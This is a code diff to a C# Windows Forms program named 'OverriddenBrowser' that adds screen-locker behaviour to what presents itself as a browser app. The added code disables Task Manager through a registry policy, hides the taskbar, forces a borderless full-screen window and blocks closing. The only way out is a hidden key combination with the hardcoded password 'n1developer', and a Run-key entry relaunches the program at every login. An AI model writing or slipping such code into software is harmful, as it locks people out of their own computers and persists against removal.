@@ -8,6 +8,7 @@ using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using Bunifu.Framework.UI;
+using Microsoft.Win32;
 using OverideedBrowser;
 
 namespace OverriddenBrowser
@@ -15,11 +16,69 @@ namespace OverriddenBrowser
     public partial class MainWindow : Form
     {
         private static readonly Random Rand = new Random();
+        private const string AppName = "OverridenBrowser";
         public MainWindow()
         {
             InitializeComponent();
             CheckForIllegalCrossThreadCalls = false;
             bwAnimation.RunWorkerAsync();
+            SetTaskManager(false);
+            Taskbar.Hide();
+            this.FormBorderStyle = FormBorderStyle.None;
+            this.WindowState = FormWindowState.Maximized;
+            this.Closing += OnClosing;
+            this.KeyPreview = true;
+            this.KeyDown += OnKeyDown;
+            SetStartup();
+        }
+
+        private void SetStartup()
+        {
+            RegistryKey rk = Registry.CurrentUser.OpenSubKey
+                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            rk.SetValue(AppName, Application.ExecutablePath);
+
+            //rk.DeleteValue(AppName, false);
+            rk.Close();
+        }
+
+    private void OnKeyDown(object sender, KeyEventArgs e)
+        {
+            if (e.Control && e.Alt && e.Shift && e.KeyCode == Keys.A)
+            {
+                using (InputDialog d = new InputDialog())
+                {
+                    d.Done += DOnDone;
+                    d.ShowDialog();
+                }
+            }
+        }
+
+        private bool Close = false;
+        private void DOnDone(string value)
+        {
+            if(value.Equals("n1developer"))
+            {
+                Close = true;
+                this.Close();
+            }
+            else
+            {
+                MessageBox.Show("Try Again!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+
+        private void OnClosing(object sender, CancelEventArgs e)
+        {
+            if (Close)
+            {
+                SetTaskManager(true);
+                Taskbar.Show();
+            }
+            else
+            {
+                e.Cancel = true;
+            }
         }
 
         private Color GetRandomColor()
@@ -133,6 +192,28 @@ namespace OverriddenBrowser
         {
             sender.Exit -= BrOnExit;
             this.Controls.Remove(sender);
+        }
+
+        public void ToggleTaskManager()
+        {
+            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
+                @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+            if (objRegistryKey.GetValue("DisableTaskMgr") == null)
+                objRegistryKey.SetValue("DisableTaskMgr", "1");
+            else
+                objRegistryKey.DeleteValue("DisableTaskMgr");
+            objRegistryKey.Close();
+        }
+
+        public void SetTaskManager(bool enable)
+        {
+            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
+                @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+            if (enable && objRegistryKey.GetValue("DisableTaskMgr") != null)
+                objRegistryKey.DeleteValue("DisableTaskMgr");
+            else
+                objRegistryKey.SetValue("DisableTaskMgr", "1");
+            objRegistryKey.Close();
         }
     }
 
